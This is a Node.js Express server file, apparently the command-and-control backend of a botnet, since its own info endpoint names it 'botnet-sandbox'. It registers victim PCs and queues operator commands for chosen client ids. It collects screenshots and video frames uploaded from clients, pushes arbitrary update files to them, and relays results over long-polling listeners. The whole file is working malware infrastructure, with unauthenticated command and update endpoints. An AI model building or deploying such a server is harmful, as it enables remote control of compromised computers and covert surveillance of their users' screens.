// This code is licensed under the isc license. You can improve the code by keeping this comments
// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
const http = require("http");
const express = require("express");
const bodyParser = require("body-parser");
const logger = require("morgan");
const fs = require("fs");
const path = require("path");
const app = express();
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || "development";
const screens = require("./screens.json");
const videos = require("./videos.json");
const update = require("./update.json");
const versions = require("./versions.json");
var ip = require("./ip.json");
var messages = require("./messages.json");
var responses = require("./responses.json");
require('dotenv').config();
app.set("port", PORT);
app.set("env", NODE_ENV);
app.use(logger("tiny"));
app.use(bodyParser.text({ limit: "50mb" }));
app.post("/api/v1/video/:id", async (req, res, next) => {
    try {
        const client = videos.find(_frame => _frame.id === Number(req.params.id))
        client.currentframe = JSON.parse(req.body);
        var svideos = JSON.stringify(videos);
        fs.writeFileSync("videos.json", svideos);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.get("/api/v1/video/:id", async (req, res, next) => {
    try {
        const client = videos.find(_frame => _frame.id === Number(req.params.id))
        res.json(client);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.post("/api/v1/screens/:id", async (req, res, next) => {
    var _sid = 0;
    try {
        const screen = screens.find(
            _screen => _screen.id === Number(req.params.id)
        );
        if (!screen) {
            screens.push({
                id: Number(req.params.id),
                screens: [
                    {
                        sid: _sid,
                        bytes: JSON.parse(req.body).bytes
                    }
                ]
            });
        } else {
            _sid = screen.screens.length;
            screen.screens.push({
                sid: _sid,
                bytes: JSON.parse(req.body).bytes
            });
        }
    } catch (e) {
        next(e);
    }
    var sscreens = JSON.stringify(screens);
    fs.writeFileSync("screens.json", sscreens);
    res.json(_sid);
    res.end();
});
app.post("/api/v1/screens/:id/:sid", async (req, res, next) => {
    try {
        const screen = screens.find(
            _screen => _screen.id === Number(req.params.id)
        );
        if (!screen) {
            const err = new Error("you must create screen first");
            throw err;
        }
        const sbscreen = screen.screens.find(
            _screens => _screens.sid === Number(req.params.sid)
        );
        if (!sbscreen) {
            const err = new Error("screen not found");
            throw err;
        }
        sbscreen.bytes = sbscreen.bytes.concat(JSON.parse(req.body).bytes);
        var supdate = JSON.stringify();
        var sscreens = JSON.stringify(screens);
        fs.writeFileSync("screens.json", sscreens);
        res.end();
    } catch (e) {
        next(e);
    }
});
app.get("/api/v1/screens/:id", async (req, res, next) => {
    try {
        const playerStats = screens.find(
            screens => screens.id === Number(req.params.id)
        );
        if (!playerStats) {
            const err = new Error("screens not found");
            err.status = 404;
            throw err;
        }
        res.json(playerStats);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.get("/api/v1/client", async (req, res, next) => {
    try {
        const playerStats = require("./ip.json");
        res.json(playerStats);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.get("/api/v1/messages", (req, res, next) => {
    try {
        res.json(messages.length);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.get("/api/v1/responses", async (req, res, next) => {
    res.json(responses);
    res.end();
});
app.get("/api/v1/responses/:id", async (req, res, next) => {
    try {
        const resp = responses.find(_resp => _resp.id === Number(req.params.id));
        if (!resp) {
            const err = new Error("client not found");
            err.status = 404;
            throw err;
        }
        res.json(resp.responses.length);
    } catch (e) {
        next(e);
    }
});
app.get("/api/v1/messages/:id", async (req, res, next) => {
    try {
        const playerStats = messages.find(
            message => message.id === Number(req.params.id)
        );
        if (!playerStats) {
            const err = new Error("message not found");
            err.status = 404;
            throw err;
        }
        res.json(playerStats);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.post("/api/v1/client", async (req, res, next) => {
    try {
        const newIP = {
            id: ip.length,
            nameofpc: JSON.parse(req.body).nameofpc
        };
        ip.push(newIP);
        var sip = JSON.stringify(ip);
        fs.writeFileSync("ip.json", sip);
        clientsresall(ip);
        res.status(201).json(ip.length - 1);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.post("/api/v1/messages", async (req, res, next) => {
    try {
        const newMessage = {
            id: messages.length,
            command: JSON.parse(req.body).command,
            ids: JSON.parse(req.body).ids
        };
        messages.push(newMessage);
        var smessages = JSON.stringify(messages);
        fs.writeFileSync("messages.json", smessages);
        mesresall(newMessage); // call listener
        res.status(201).json(newMessage);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.delete("/api/v1/messages", async (req, res, next) => {
    messages = [];

    res.end();
});
app.get("/api", async (req, res) => {
    var json = {
        uri: "http://botnet-sandbox.glitch.me/",
        version: 1,
        port: PORT,
        environment: NODE_ENV,
        clients: ip.length,
        messages: messages.length
    };
    res.json(json);

    res.end();
});
app.get("/api/v1/responses/:id", async (req, res, next) => {

});
app.post("/api/v1/response/", async (req, res, next) => {
    try {
        const newResponse = {
            id: JSON.parse(req.body).id,
            response: JSON.parse(req.body).response
        };
        responses.push(newResponse);
        var sresponses = JSON.stringify(responses);
        fs.writeFileSync("responses.json", sresponses);
        respresall(newResponse);
        res.status(201).json(ip.length - 1);
    } catch (e) {
        next(e);
    }
    var sresponses = JSON.stringify(responses);
    fs.writeFileSync("responses.json", sresponses);
    res.end();
});
app.delete("/api/v1/responses", async (req, res, next) => {
    responses = [];

    res.end();
});
app.delete("/api/v1/client/:id", async (req, res, next) => {
    ip.splice(ip.indexOf(ip.find(x => x.id === Number(req.params.id))), 1);
    var sip = JSON.stringify(ip);
    fs.writeFileSync("ip.json", sip);
    clientsresall(ip);

    res.end();
});
app.get("/api/v1/admin/:password", async (req, res, next) => {
    if (process.env.SECRET === String(req.params.password)) {
        res.json(true);
    } else {
        res.json(false);
    }
});
app.get("/api/v1/ip", async (req, res, next) => {
    try {
        const err = new Error("I’m a teapot");
        err.status = 418;
        throw err;
    } catch (e) {
        next(e);
    }
    res.end();
});
app.get("/sandbox", async (req, res, next) => {
    res.json("Who are you?");
    res.end();
});
app.get("/sandbox/:id", async (req, res, next) => {
    res.json(req.params.id);
    res.end();
});
app.post("/api/v1/sandbox", async (req, res, next) => {
    try {
        if (String(req.body) === "Make a coffee") {
            const err = new Error("I’m a teapot");
            err.status = 418;
            throw err;
        }
    } catch (e) {
        next(e);
    }
    res.end();
});
app.delete("/sandbox", async (req, res, next) => {
    res.json("Deleted!");
    res.end();
});
app.post("/api/v1/update", async (req, res, next) => {
    try {
        update.filename = JSON.parse(req.body).filename;
        update.filebytes = JSON.parse(req.body).filebytes;
        var supdate = JSON.stringify(update);
        fs.writeFileSync("update.json", supdate);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.post("/api/v1/nextupdate", async (req, res, next) => {
    try {
        update.filebytes = update.filebytes.concat(JSON.parse(req.body).filebytes);
        var supdate = JSON.stringify(update);
        fs.writeFileSync("update.json", supdate);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.get("/api/v1/update", async (req, res, next) => {
    try {
        res.json(update);
    } catch (e) {
        next(e);
    }
    res.end();
});
app.get("/api/v1/support/versions/:version", async (req, res, next) => {
    try {
        const version = versions.find(x => x.version === String(req.params.version));
        res.json(version);
    } catch (e) {
        next(e);
    }
});
var httpresponses4mes = [];
function mesresall(newMessage) {
    httpresponses4mes.forEach(x => { x.json(newMessage); x.end(); });
    httpresponses4mes = [];
}
app.get("/api/v1/listen/messages", async (req, res, next) => {
    try {
        res.setHeader('connection', 'keep-alive');
        res.setTimeout(86400000, function () {
            let err = new Error('Request Timeout');
            err.status = 408;
            next(err);
        });
        req.setTimeout(86400000, function () {
            let err = new Error('Request Timeout');
            err.status = 408;
            next(err);
        });
        httpresponses4mes.push(res);
    } catch (e) {
        next(e);
    }
});
var httpresponse4res = [];
function respresall(newResponse) {
    httpresponse4res.forEach(x => { x.json(newResponse); x.end(); });
    httpresponse4res = [];
}
app.get("/api/v1/listen/responses/", async (req, res, next) => {
    try {
        res.setHeader('connection', 'keep-alive');
        res.setTimeout(86400000, function () {
            let err = new Error('Request Timeout');
            err.status = 408;
            next(err);
        });
        req.setTimeout(86400000, function () {
            let err = new Error('Request Timeout');
            err.status = 408;
            next(err);
        });
        httpresponse4res.push(res);
    } catch (e) {
        next(e);
    }
});
var httpresponse4clients = [];
function clientsresall(newClients) {
    httpresponse4clients.forEach(x => { x.json(newClients); x.end(); })
    httpresponse4clients = [];
}
app.get("/api/v1/listen/clients", async (req, res, next) => {
    try {
        res.setHeader('connection', 'keep-alive');
        res.setTimeout(86400000, function () {
            let err = new Error('Request Timeout');
            err.status = 408;
            next(err);
        });
        req.setTimeout(86400000, function () {
            let err = new Error('Request Timeout');
            err.status = 408;
            next(err);
        });
        httpresponse4clients.push(res);
    } catch (e) {
        next(e);
    }
});
app.get("/api/v1/support/version_note/:version", (req, res, next) => {
    try {
        var note = versions.find(x => x.version === req.params.version).custommessage;
        res.json(note);
        res.end();
    }
    catch (e) {
        next(e);
    }
});
app.use((req, res, next) => {
    const err = new Error(`${req.method} ${req.url} Not Found`);
    err.status = 404;
    next(err);
});
app.use((err, req, res, next) => {
    console.error(err);
    res.status(err.status || 500);
    res.json({
        error: {
            status: err.status,
            message: err.message
        }
    });
});
var server = app.listen(PORT, async () => {
    console.log(
        `Express Server started on Port ${app.get(
            "port"
        )} | Environment : ${app.get("env")}`
    );
});
server.timeout = 86400000;
server.on("connection", async (listener) => {
    console.log("Someone has connected")
    listener.on("data", async (data) => {
        console.log("data recived " + data);
    });
});